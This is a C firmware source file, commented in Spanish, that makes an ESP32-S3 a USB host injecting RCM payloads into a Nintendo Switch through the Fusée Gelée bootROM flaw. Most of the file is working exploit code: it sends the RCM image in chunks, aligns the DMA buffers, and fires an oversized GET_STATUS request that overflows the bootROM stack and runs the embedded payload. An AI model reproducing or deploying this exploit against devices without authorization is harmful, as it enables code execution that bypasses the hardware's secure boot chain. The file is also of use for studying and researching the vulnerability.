// main.c - Inyector de payloads RCM (fusee gelee) para Nintendo Switch
//          usando el puerto USB OTG (host) de un ESP32-S3.
//
// Flujo:
//   1. Se instala el stack USB Host de ESP-IDF y se espera a que aparezca
//      un dispositivo NVIDIA con VID 0x0955 (la consola en modo RCM).
//   2. Se abre el dispositivo, se reclama la interfaz 0 y se leen los 16
//      bytes del Device ID por el endpoint bulk IN 0x81.
//   3. Se construye la imagen RCM y se envia en bloques de 0x1000 bytes por
//      el endpoint bulk OUT 0x01, alternando los dos buffers DMA del bootROM.
//   4. Se ajusta la paridad para que el ultimo buffer usado sea el alto
//      (0x40009000) y se dispara el memcpy vulnerable con un GET_STATUS al
//      endpoint (0x82, wLength = 0x7000). La consola ejecuta el payload.
//
// SPDX-License-Identifier: GPL-2.0-only

#include <inttypes.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "freertos/task.h"

#include "esp_err.h"
#include "esp_log.h"
#include "esp_timer.h"

#include "usb/usb_host.h"

#include "rcm.h"

static const char *TAG = "rcm";

// Identificadores del dispositivo NVIDIA APX / Tegra RCM.
#define RCM_VID         0x0955
#define RCM_PID_T210    0x7321  // Tegra X1 (Erista)
#define RCM_PID_T210B   0x7721  // Tegra X1+ (Mariko) en RCM

// Endpoints del protocolo RCM.
#define RCM_EP_OUT      0x01
#define RCM_EP_IN       0x81

// Longitud del GET_STATUS que dispara el overflow (0x40010000 - 0x40009000).
#define RCM_TRIGGER_LEN 0x7000

// Timeouts (ms).
#define RCM_TIMEOUT_XFER    2000
#define RCM_TIMEOUT_ID      3000
#define RCM_TIMEOUT_TRIGGER 3000

// El payload se embebe en el firmware desde main/payload.bin (ver CMakeLists.txt).
extern const uint8_t payload_bin_start[] asm("_binary_payload_bin_start");
extern const uint8_t payload_bin_end[] asm("_binary_payload_bin_end");

typedef enum {
    DEV_EVENT_NEW,
    DEV_EVENT_GONE,
} dev_event_type_t;

typedef struct {
    dev_event_type_t type;
    uint8_t address;
    usb_device_handle_t handle;
} dev_event_t;

static usb_host_client_handle_t s_client;
static usb_device_handle_t s_dev;
static QueueHandle_t s_event_queue;

static usb_transfer_t *s_bulk_out;
static usb_transfer_t *s_bulk_in;
static usb_transfer_t *s_ctrl;

static volatile bool s_xfer_done;
static volatile usb_transfer_status_t s_xfer_status;
static volatile int s_xfer_actual;
static usb_transfer_t *volatile s_pending;

static rcm_image_t s_image;
static uint8_t s_chunk[RCM_CHUNK_SIZE];

// ----------------------------------------------------------------------------
// Utilidades de transferencia
// ----------------------------------------------------------------------------

static void transfer_cb(usb_transfer_t *transfer)
{
    // Ignora finalizaciones tardias de transfers que ya dimos por perdidos.
    if (transfer != s_pending) {
        return;
    }
    s_xfer_status = transfer->status;
    s_xfer_actual = transfer->actual_num_bytes;
    s_xfer_done = true;
}

/**
 * Procesa eventos del cliente USB hasta que la transferencia actual termine
 * o se agote el timeout. Los callbacks de las transferencias se ejecutan
 * dentro de usb_host_client_handle_events(), por eso hay que seguir
 * llamandolo mientras esperamos.
 */
static bool pump_until_done(int timeout_ms)
{
    const int64_t deadline = esp_timer_get_time() + (int64_t)timeout_ms * 1000;
    bool completed = false;

    while (!s_xfer_done) {
        usb_host_client_handle_events(s_client, pdMS_TO_TICKS(10));
        if (esp_timer_get_time() > deadline) {
            break;
        }
    }
    completed = s_xfer_done;

    // A partir de aqui, cualquier finalizacion tardia de este transfer se
    // ignora (ver transfer_cb).
    s_pending = NULL;
    return completed;
}

static bool bulk_write(const uint8_t *data, size_t len)
{
    if (len == 0 || len > RCM_CHUNK_SIZE) {
        return false;
    }

    memcpy(s_bulk_out->data_buffer, data, len);
    s_bulk_out->num_bytes = (int)len;
    s_bulk_out->device_handle = s_dev;
    s_bulk_out->bEndpointAddress = RCM_EP_OUT;
    s_bulk_out->timeout_ms = 1000;
    s_bulk_out->callback = transfer_cb;
    s_bulk_out->context = NULL;

    s_xfer_done = false;
    s_pending = s_bulk_out;
    esp_err_t err = usb_host_transfer_submit(s_bulk_out);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "No se pudo enviar el bloque bulk: %s", esp_err_to_name(err));
        return false;
    }

    if (!pump_until_done(RCM_TIMEOUT_XFER)) {
        ESP_LOGE(TAG, "Timeout enviando bloque bulk");
        return false;
    }
    return s_xfer_status == USB_TRANSFER_STATUS_COMPLETED;
}

static bool read_device_id(void)
{
    memset(s_bulk_in->data_buffer, 0, s_bulk_in->data_buffer_size);

    // El bootROM envia 16 bytes; pedimos 64 (multiplo del MPS) y aceptamos
    // el paquete corto como transferencia completada.
    s_bulk_in->num_bytes = 64;
    s_bulk_in->device_handle = s_dev;
    s_bulk_in->bEndpointAddress = RCM_EP_IN;
    s_bulk_in->timeout_ms = 1000;
    s_bulk_in->callback = transfer_cb;
    s_bulk_in->context = NULL;

    s_xfer_done = false;
    s_pending = s_bulk_in;
    esp_err_t err = usb_host_transfer_submit(s_bulk_in);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "No se pudo leer el Device ID: %s", esp_err_to_name(err));
        return false;
    }

    if (!pump_until_done(RCM_TIMEOUT_ID)) {
        ESP_LOGE(TAG, "Timeout leyendo el Device ID");
        return false;
    }
    if (s_xfer_status != USB_TRANSFER_STATUS_COMPLETED || s_xfer_actual <= 0) {
        ESP_LOGE(TAG, "Lectura de Device ID fallida (status=%d, bytes=%d)",
                 (int)s_xfer_status, s_xfer_actual);
        return false;
    }

    ESP_LOGI(TAG, "Device ID (%d bytes):", s_xfer_actual);
    for (int i = 0; i < s_xfer_actual && i < 32; i++) {
        printf("%02x", s_bulk_in->data_buffer[i]);
    }
    printf("\n");
    return true;
}

// ----------------------------------------------------------------------------
// Exploit
// ----------------------------------------------------------------------------

/**
 * Dispara el memcpy vulnerable: GET_STATUS al endpoint con wLength = 0x7000.
 * El bootROM copia 0x7000 bytes desde el buffer DMA alto (0x40009000) hacia
 * 0x40010000, pisando la pila con el stack spray y saltando al payload.
 */
static bool trigger_exploit(void)
{
    usb_setup_packet_t *setup = (usb_setup_packet_t *)s_ctrl->data_buffer;
    memset(setup, 0, sizeof(*setup));
    setup->bmRequestType = 0x82;  // device-to-host | standard | endpoint
    setup->bRequest = 0x00;       // GET_STATUS
    setup->wValue = 0;
    setup->wIndex = 0;
    setup->wLength = RCM_TRIGGER_LEN;

    s_ctrl->num_bytes = sizeof(usb_setup_packet_t) + RCM_TRIGGER_LEN;
    s_ctrl->device_handle = s_dev;
    s_ctrl->bEndpointAddress = 0;  // EP0
    s_ctrl->timeout_ms = 1000;
    s_ctrl->callback = transfer_cb;
    s_ctrl->context = NULL;

    s_xfer_done = false;
    s_pending = s_ctrl;
    esp_err_t err = usb_host_transfer_submit_control(s_client, s_ctrl);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "No se pudo disparar el exploit: %s", esp_err_to_name(err));
        return false;
    }

    // Es normal que la transferencia no termine "bien": la consola muere a
    // mitad del memcpy y se reinicia con el payload. Cualquier final (timeout,
    // NO_DEVICE, error) es compatible con un disparo correcto.
    if (!pump_until_done(RCM_TIMEOUT_TRIGGER)) {
        ESP_LOGW(TAG, "El GET_STATUS no completo (esperado: la consola se reinicia)");
    } else {
        ESP_LOGI(TAG, "GET_STATUS termino con status=%d, bytes=%d",
                 (int)s_xfer_status, s_xfer_actual);
    }
    return true;
}

static bool send_image(void)
{
    ESP_LOGI(TAG, "Enviando imagen RCM: %u bytes (%u bloques)",
             (unsigned)s_image.image_len, (unsigned)s_image.chunk_count);

    for (size_t i = 0; i < s_image.chunk_count; i++) {
        rcm_image_chunk(&s_image, i, s_chunk);
        if (!bulk_write(s_chunk, RCM_CHUNK_SIZE)) {
            ESP_LOGE(TAG, "Fallo enviando el bloque %u", (unsigned)i);
            return false;
        }
    }

    // El host alterna el buffer DMA en cada bloque: tras un numero par de
    // bloques el siguiente destino seria el buffer bajo. Enviamos un bloque
    // extra de ceros para que el memcpy copie desde el buffer alto (0x7000
    // bytes en lugar de 0xB000).
    if ((s_image.chunk_count % 2) == 0) {
        memset(s_chunk, 0, sizeof(s_chunk));
        if (!bulk_write(s_chunk, RCM_CHUNK_SIZE)) {
            ESP_LOGE(TAG, "Fallo enviando el bloque de alineacion");
            return false;
        }
        ESP_LOGD(TAG, "Bloque extra enviado para usar el buffer DMA alto");
    }

    return true;
}

// ----------------------------------------------------------------------------
// Manejo del dispositivo
// ----------------------------------------------------------------------------

static bool is_rcm_device(const usb_device_desc_t *desc)
{
    return desc != NULL &&
           desc->idVendor == RCM_VID &&
           (desc->idProduct == RCM_PID_T210 || desc->idProduct == RCM_PID_T210B);
}

static void handle_new_device(uint8_t address)
{
    if (s_dev != NULL) {
        // Ya estamos trabajando con un dispositivo; ignoramos eventos nuevos.
        return;
    }

    esp_err_t err = usb_host_device_open(s_client, address, &s_dev);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "No se pudo abrir el dispositivo %u: %s", address, esp_err_to_name(err));
        s_dev = NULL;
        return;
    }

    const usb_device_desc_t *desc = NULL;
    err = usb_host_get_device_descriptor(s_dev, &desc);
    if (err != ESP_OK || !is_rcm_device(desc)) {
        ESP_LOGI(TAG, "Dispositivo %04x:%04x ignorado",
                 desc ? desc->idVendor : 0, desc ? desc->idProduct : 0);
        goto cleanup;
    }

    ESP_LOGI(TAG, "Consola en RCM detectada (%04x:%04x)", desc->idVendor, desc->idProduct);
    if (desc->idProduct == RCM_PID_T210B) {
        ESP_LOGW(TAG, "PID 0x7721 (Mariko): RCM esta parcheado en estas consolas;");
        ESP_LOGW(TAG, "el payload probablemente no se ejecute.");
    }

    err = usb_host_interface_claim(s_client, s_dev, 0, 0);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "No se pudo reclamar la interfaz 0: %s", esp_err_to_name(err));
        goto cleanup;
    }

    if (!read_device_id()) {
        ESP_LOGE(TAG, "La consola no respondio al Device ID. Reinicia en modo RCM.");
        usb_host_interface_release(s_client, s_dev, 0);
        goto cleanup;
    }

    if (!send_image()) {
        ESP_LOGE(TAG, "No se pudo enviar la imagen RCM. Vuelve a conectar la consola.");
        usb_host_interface_release(s_client, s_dev, 0);
        goto cleanup;
    }

    ESP_LOGI(TAG, "Imagen enviada. Disparando el exploit...");
    if (trigger_exploit()) {
        ESP_LOGI(TAG, "Payload inyectado. La consola deberia estar arrancando.");
    } else {
        ESP_LOGE(TAG, "No se pudo disparar el exploit. Desconecta la consola y reintenta.");
    }

    // No cerramos el dispositivo aqui: la transferencia de disparo puede
    // seguir en vuelo. Se cierra al recibir DEV_GONE, cuando la consola ya
    // se reinicio (o cuando el usuario la desconecta).
    return;

cleanup:
    usb_host_device_close(s_client, s_dev);
    s_dev = NULL;
}

// ----------------------------------------------------------------------------
// Tareas USB
// ----------------------------------------------------------------------------

static void client_event_cb(const usb_host_client_event_msg_t *event, void *arg)
{
    (void)arg;
    dev_event_t evt = { 0 };

    if (event->event == USB_HOST_CLIENT_EVENT_NEW_DEV) {
        evt.type = DEV_EVENT_NEW;
        evt.address = event->new_dev.address;
        xQueueSend(s_event_queue, &evt, 0);
    } else if (event->event == USB_HOST_CLIENT_EVENT_DEV_GONE) {
        evt.type = DEV_EVENT_GONE;
        evt.handle = event->dev_gone.dev_hdl;
        xQueueSend(s_event_queue, &evt, 0);
    }
}

static void usb_lib_task(void *arg)
{
    (void)arg;

    while (true) {
        uint32_t flags = 0;
        usb_host_lib_handle_events(portMAX_DELAY, &flags);
        if (flags & USB_HOST_LIB_EVENT_FLAGS_NO_CLIENTS) {
            ESP_LOGD(TAG, "USB host sin clientes");
        }
        if (flags & USB_HOST_LIB_EVENT_FLAGS_ALL_FREE) {
            ESP_LOGD(TAG, "USB host libero todos los dispositivos");
        }
    }
}

static void usb_client_task(void *arg)
{
    (void)arg;

    ESP_LOGI(TAG, "Esperando una consola en modo RCM (VID %04x)...", RCM_VID);

    while (true) {
        usb_host_client_handle_events(s_client, pdMS_TO_TICKS(20));

        dev_event_t evt;
        while (xQueueReceive(s_event_queue, &evt, 0) == pdTRUE) {
            switch (evt.type) {
            case DEV_EVENT_NEW:
                handle_new_device(evt.address);
                break;
            case DEV_EVENT_GONE:
                if (evt.handle == s_dev) {
                    s_dev = NULL;
                    usb_host_device_close(s_client, evt.handle);
                }
                break;
            }
        }
    }
}

// ----------------------------------------------------------------------------
// Arranque
// ----------------------------------------------------------------------------

static void usb_host_init(void)
{
    const usb_host_config_t host_config = {
        .skip_phy_setup = false,
        .intr_flags = ESP_INTR_FLAG_LEVEL1,
    };
    ESP_ERROR_CHECK(usb_host_install(&host_config));

    s_event_queue = xQueueCreate(8, sizeof(dev_event_t));
    ESP_ERROR_CHECK(s_event_queue != NULL ? ESP_OK : ESP_ERR_NO_MEM);

    BaseType_t ok = xTaskCreate(usb_lib_task, "usb_lib", 4096, NULL, 2, NULL);
    ESP_ERROR_CHECK(ok == pdPASS ? ESP_OK : ESP_ERR_NO_MEM);

    const usb_host_client_config_t client_config = {
        .is_synchronous = false,
        .max_num_event_msg = 5,
        .async = {
            .client_event_callback = client_event_cb,
            .callback_arg = NULL,
        },
    };
    ESP_ERROR_CHECK(usb_host_client_register(&client_config, &s_client));

    ok = xTaskCreate(usb_client_task, "usb_client", 8192, NULL, 3, NULL);
    ESP_ERROR_CHECK(ok == pdPASS ? ESP_OK : ESP_ERR_NO_MEM);
}

static void transfers_alloc(void)
{
    ESP_ERROR_CHECK(usb_host_transfer_alloc(RCM_CHUNK_SIZE, 0, &s_bulk_out));
    ESP_ERROR_CHECK(usb_host_transfer_alloc(64, 0, &s_bulk_in));
    ESP_ERROR_CHECK(usb_host_transfer_alloc(sizeof(usb_setup_packet_t) + RCM_TRIGGER_LEN, 0,
                                            &s_ctrl));
}

void app_main(void)
{
    const size_t payload_len = (size_t)(payload_bin_end - payload_bin_start);

    ESP_LOGI(TAG, "Inyector RCM para Nintendo Switch (ESP32-S3, USB OTG host)");
    ESP_LOGI(TAG, "Payload embebido: %u bytes", (unsigned)payload_len);

    esp_err_t err = rcm_image_init(&s_image, payload_bin_start, payload_len);
    if (err == ESP_ERR_INVALID_SIZE) {
        ESP_LOGE(TAG, "Payload demasiado grande: el maximo es %u bytes",
                 (unsigned)RCM_MAX_PAYLOAD_SIZE);
        return;
    }
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Payload invalido (minimo %u bytes)", (unsigned)RCM_MIN_PAYLOAD_SIZE);
        return;
    }

    ESP_LOGI(TAG, "Imagen RCM: %u bytes en %u bloques de 0x1000",
             (unsigned)s_image.image_len, (unsigned)s_image.chunk_count);

    transfers_alloc();
    usb_host_init();

    // La tarea principal ya no hace nada mas: el trabajo ocurre en usb_client_task().
}
